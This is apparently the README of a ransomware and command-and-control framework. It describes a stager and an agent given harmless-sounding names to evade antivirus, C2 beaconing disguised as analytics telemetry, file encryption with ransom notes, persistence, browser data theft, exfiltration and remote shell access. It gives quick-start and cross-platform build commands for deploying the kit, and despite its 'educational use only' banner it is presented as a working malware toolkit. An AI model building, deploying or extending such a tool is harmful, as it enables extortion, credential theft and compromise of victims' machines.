# RogueByte's C2 Framework

> **WARNING:** For educational use only in isolated, controlled environments (VMs, lab networks).
> Only run on files you own or have explicit permission to encrypt.

Cross-platform (Linux/Windows) ransomware simulation with hybrid encryption (RSA + Fernet),
C2 beaconing, staged deployment for AV evasion, and a modern WebSocket-powered React dashboard.

## Architecture

```
┌────────────────────────┐     HTTPS/beacon     ┌──────────────────────────────┐
│    Victim Machine      │◄────────────────────►│         C2 Server            │
│                        │    commands/results   │                              │
│  hw_detect (stager)    │                      │  Flask + SocketIO (port 4444)│
│  gpu_helper (ransom.)  │                      │  SQLite DB (encrypted at rest)│
│                        │                      │  WebSocket → React Dashboard │
└────────────────────────┘                      └──────────────────────────────┘
```

## Directory Structure

```
├── agents/              → hw_detect stager + gpu_helper ransomware agent
├── server/              → C2 server (Flask + SocketIO + Gevent)
│   ├── c2_server.py
│   ├── data/            → SQLite DB, keys/, exfil/
│   └── static/          → React SPA (Vite build output)
├── client/              → React + Vite dashboard source
│   └── src/
├── tools/               → key_gen.py + build.py (PyInstaller + Docker cross-compile)
├── lib/                 → Shared modules (persistence, crypto, evasion, browser_stealer)
├── dist/                → Compiled binaries (linux/ + windows/)
├── Backup - Keys/       → RSA/ECC keypair backups
└── legacy/              → Archived V1 prototype
```

## Quick Start

```bash
pip install -r requirements.txt              # Dependencies
python3 tools/key_gen.py                      # Generate RSA keypair
python3 server/c2_server.py                   # Start C2 on :4444
python3 agents/ransomware_linux.py            # Run agent (dev mode, Linux)
```

Open http://localhost:4444 in a browser.

## Agent Commands

| Command | Stager | Ransomware | Description |
|---|---|---|---|
| `deploy` | ✅ | ❌ | Download gpu_helper from C2, spawn it, start watchdog |
| `encrypt` | ❌ | ✅ | Encrypt targeted files with RSA + Fernet |
| `decrypt` | ❌ | ✅ | Decrypt files with RSA private key |
| `exec` | ✅ | ✅ | Run a shell command (returns stdout/stderr) |
| `persist` | ✅ | ✅ | Install systemd/Registry persistence |
| `self_destruct` | ✅ | ✅ | Remove persistence, delete binaries, exit |
| `status` | ✅ | ✅ | Report system info and state |
| `screenshot` | ❌ | ✅ | Capture desktop screenshot |
| `pslist` | ❌ | ✅ | List running processes |
| `pskill` | ❌ | ✅ | Kill a process by PID |
| `steal_browsers` | ❌ | ✅ | Exfiltrate browser profile data |
| `scare` | ❌ | ✅ | Scatter DedSec GIFs across system, open 5 in browser |
| `download` | ❌ | ✅ | Download a file from victim |
| `upload` | ❌ | ✅ | Upload a file to victim |
| `network_info` | ❌ | ✅ | Show network connections |
| `show_ransomnote` | ❌ | ✅ | Display ransom note |
| `terminal` | ❌ | ✅ | Interactive shell session |

## Building for Production

```bash
python3 server/c2_server.py   # Must be running first (generates traffic key)
python3 tools/build.py         # Compiles hw_detect + gpu_helper for Linux + Windows
```

Output goes to `dist/linux/` and `dist/windows/`. The build script auto-uploads
`gpu_helper` to the C2 server for staged deployment.

## Security Notes

- All victim data at rest is Fernet-encrypted in SQLite (`c2_key.key`)
- Beacon traffic is Fernet-encrypted, disguised as analytics telemetry
- RSA-2048 private key is **never** embedded in the agent
- Runtime keys stored in `server/data/keys/` (not in the repo — see `.gitignore`)
- `C2_API_KEY` env var for REST API authentication
- `C2_SHUTDOWN_KEY` env var (default: `shutdown`) for `/api/shutdown`
